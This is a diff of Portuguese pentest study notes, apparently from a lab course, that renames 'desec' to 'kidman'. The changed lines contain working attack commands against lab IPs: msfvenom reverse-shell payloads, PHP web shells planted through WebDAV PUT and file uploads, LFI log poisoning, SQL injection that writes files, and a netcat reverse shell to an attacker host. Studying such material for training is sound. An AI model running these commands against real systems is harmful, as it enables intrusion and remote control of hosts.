@@ -418,7 +418,7 @@ Faz um parsing em uma pagina trazendo os links que a mesma possui.
 
 Pega a saída do pasring acima e gera a lista de IP dos links capturados.
 
-	for ip in $(cat hostsativoVPNdesec);do hping3 -SA -p 1337 $ip;done                                                                                             
+	for ip in $(cat hostsativoVPNkidman);do hping3 -SA -p 1337 $ip;done                                                                                             
 Pega a lista de IP e faz um teste na porta 1337 para saber se a mesma está aberta.	
 
 [Port Knocking:](https://www.howtogeek.com/442733/how-to-use-port-knocking-on-linux-and-why-you-shouldnt/)
@@ -812,7 +812,7 @@ Descoberta de HOST por Brute Force
 
 Descoberta de Domínios por IP
 
-    host -t txt desec.com.br 
+    host -t txt kidman.com.br 
 
 Irá retornar os códigos do SPF sabendo se é vulnerável ou não então, realizar teste de envio spoofing: Email Sender: https://emkei.cz/
 
@@ -1885,7 +1885,7 @@ Auxiliar para brute force de logind http
 
 Ferramenta usada para desenvolver exploit, shell
 
-    msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.0.16 lport:443 -f exe -o shelldesec.exe 
+    msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.0.16 lport:443 -f exe -o shellkidman.exe 
 
 Criar Exploit em EXE
 
@@ -1909,11 +1909,11 @@ Cria jobs para acessar novamente tipo sessions
 
 Lista os jobs criados com o exploit -j. O -K mata todos os jobs
 
-    msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.0.16 lport:443 -f war -o desec.war 
+    msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.0.16 lport:443 -f war -o kidman.war 
 
 Cria exploit em war
 
-    msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.16 lport:443 -f raw > desec.php 
+    msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.16 lport:443 -f raw > kidman.php 
 
 Cria exploit em php
 
@@ -1929,7 +1929,7 @@ Nota: Solução Lab KidMan Metasploit:
 ## HASHES E SENHAS - LINUX
 
 
-    echo -n "desec" | md5sum or | sha512sum or | sha256sum | sha1sum 
+    echo -n "kidman" | md5sum or | sha512sum or | sha256sum | sha1sum 
 
 Codifica uma palavra em uma hash
 
@@ -1944,8 +1944,8 @@ Ler e modifica um arquivo
 Hash com Python: 
 
         Import Hashlib.md5("KidMan").hexdigest()
-        Import base64.b64encode("desec")
-        Import base64.b64decode("desec")
+        Import base64.b64encode("kidman")
+        Import base64.b64decode("kidman")
 .
 
     hashid hashhere 
@@ -2730,7 +2730,7 @@ Linkar o obj gerando o exe
 
 	section .data
 
-	    texto db "www.desecsecurity.com",0
+	    texto db "www.kidmansecurity.com",0
 
 	    titulo db "keep Learning",0
 
@@ -3603,7 +3603,7 @@ Todos os comandos são intuitivos, não precisa de descrição...
     select user();
     select version();
     create database Kidman;
-    use desec;
+    use kidman;
     show tables;
     create table usuarios
         (id int primary key auto_increment,
@@ -3635,16 +3635,16 @@ Todos os comandos são intuitivos, não precisa de descrição...
     
 Traz todas as tabelas de todos os bancos
 
-    select table_name from tables where table_schema="desec"; 
+    select table_name from tables where table_schema="kidman"; 
 
-Mostra diretamente as tabelas da base desec
+Mostra diretamente as tabelas da base kidman
 
     describe columns;
-    select column_name from columns where table_schema="desec"; 
+    select column_name from columns where table_schema="kidman"; 
 
-Faz um filtro para mostrar a tabela usuarios da base desec
+Faz um filtro para mostrar a tabela usuarios da base kidman
 
-    use desec;
+    use kidman;
     select login,senha from usuarios;
     select concat(login, ':' ,senha) from usuarios 
 
@@ -3664,8 +3664,8 @@ Aguarda em segundos a resposta do banco
 
 Taz um caractere correspondente
 
-    select length("desec");
-    select substring("desec",1,3); 
+    select length("kidman");
+    select substring("kidman",1,3); 
 
 Traz as 3 primeiras letras da palavra
 
@@ -3724,17 +3724,17 @@ Nota: CVE-2017-12615 Vulnerabilidade de exploração do método PUT no webdav
 
 Envia comando em php para interpretar e ganhar acesso ao host.
 
-    curl -v -X PUT -d "<?php system(\$_GET["desec"])?>" http://192.168.1.10/webdav/com_par.php
+    curl -v -X PUT -d "<?php system(\$_GET["kidman"])?>" http://192.168.1.10/webdav/com_par.php
 
-Na URL passa o parâmetro /?desec=cat /etc/passwd Explora podendo executar comandos
+Na URL passa o parâmetro /?kidman=cat /etc/passwd Explora podendo executar comandos
 
     curl -v http://192.168.1.10/webdav/ --upload-file shell.php 
 
 Fazer upload do código em php para o dir
 
-    shell.php <?php system($_GET["desec"]); ?> 
+    shell.php <?php system($_GET["kidman"]); ?> 
 
-Arquivo shell para chamar na URL e executar comandos (/?desec=cat /etc/passwd)
+Arquivo shell para chamar na URL e executar comandos (/?kidman=cat /etc/passwd)
 
     cadaver http://192.168.1.10/webdav/
 
@@ -3813,7 +3813,7 @@ Exemplos abaixo:
 
     http://192.168.1.10/turismo/info.php?p=/../../../../var/log/apache2/access.log 
 
-Para acesso ao log injetar via nc -v 192.168.1.10 80 -C a shell <?php system(\$_GET['desec']);?> via requisição e depois colocar no final da URL /access.log&param=ifconfig. Verificar se o host também dispõe de outras portas abertas, por exemplo a 25 para fazer a exploração SMTP e por aí vai.
+Para acesso ao log injetar via nc -v 192.168.1.10 80 -C a shell <?php system(\$_GET['kidman']);?> via requisição e depois colocar no final da URL /access.log&param=ifconfig. Verificar se o host também dispõe de outras portas abertas, por exemplo a 25 para fazer a exploração SMTP e por aí vai.
 
 1. Parte Email a Reverse Shell 
 
@@ -3998,7 +3998,7 @@ Fazer o carregamento de arquivos através da falha de SQL Injection error based
 
 Ler arquivo através da falha
 
-    192.168.1.10/turismo/agencias.php?loja=' union all select 1,2,3,4,"KidMan" INTO OUTFILE "/var/www/html/turismo/banner/desec.txt" %23 
+    192.168.1.10/turismo/agencias.php?loja=' union all select 1,2,3,4,"KidMan" INTO OUTFILE "/var/www/html/turismo/banner/kidman.txt" %23 
 
 Encontrar arquivo que tenha permissão de escrita para inserir o arquivo
 
@@ -4187,11 +4187,11 @@ Identificar na aplicação campo de upload de arquivos.
 
 Fazer o upload de arquivo com a extensão da aplicação .php .aspx <?php system($_POST['hack'])?>
 
-    curl http://172.30.0.40/_old/upload/desec.php -d "hack=id" 
+    curl http://172.30.0.40/_old/upload/kidman.php -d "hack=id" 
 
 Pegando o ID da máquina alvo
 
-    curl http://172.30.0.40/_old/upload/desec.php -d "hack=/bin/nc 192.168.2.10 4455 -e /bin/bash/"
+    curl http://172.30.0.40/_old/upload/kidman.php -d "hack=/bin/nc 192.168.2.10 4455 -e /bin/bash/"
 
 Para pegar a shell verificar se tem o netcat funcionando e abrir uma shell 
 
@@ -4206,7 +4206,7 @@ Fazer o upload de um arquivo .htaccess pedindo para a aplicação interpretar co
 
 - Bypass Upload: Tipo de conteúdo
 
-Quando a aplicação trava o envio de uma extensão diferente da que ele permite tanto pelo tipo do arquivo `.pdf` quanto pelo head `%PDF-1.5` É nesse caso necessário criar o script com a extensão `.php.pdf` com o head `%PDF-1.5`. para que a aplicação aceite o upload. Para fazer o teste, criar um script php com o comando  `echo mime_content_type('desec.php.pdf');`  e ver se o script reconhece como pdf de fato contendo o head com a flag pdf. Nisso subir o arquivo para a aplicação e usar a falha de LFI para acessar o arquivo e executar comandos em `http://192.168.1.231/index.php?page=uploads/shell-get.php.pdf%00&kidman=id` Os caracteres `%00` servem para ignorar a extensao `.pdf`  no final
+Quando a aplicação trava o envio de uma extensão diferente da que ele permite tanto pelo tipo do arquivo `.pdf` quanto pelo head `%PDF-1.5` É nesse caso necessário criar o script com a extensão `.php.pdf` com o head `%PDF-1.5`. para que a aplicação aceite o upload. Para fazer o teste, criar um script php com o comando  `echo mime_content_type('kidman.php.pdf');`  e ver se o script reconhece como pdf de fato contendo o head com a flag pdf. Nisso subir o arquivo para a aplicação e usar a falha de LFI para acessar o arquivo e executar comandos em `http://192.168.1.231/index.php?page=uploads/shell-get.php.pdf%00&kidman=id` Os caracteres `%00` servem para ignorar a extensao `.pdf`  no final
 
 - Bypass de Upload de Imagens
 
@@ -4543,7 +4543,7 @@ Comandos úteis para fazer o reconhecimento do ambiente
 
     whoami /groups
 
-    net user desec
+    net user kidman
 
     ne user
 
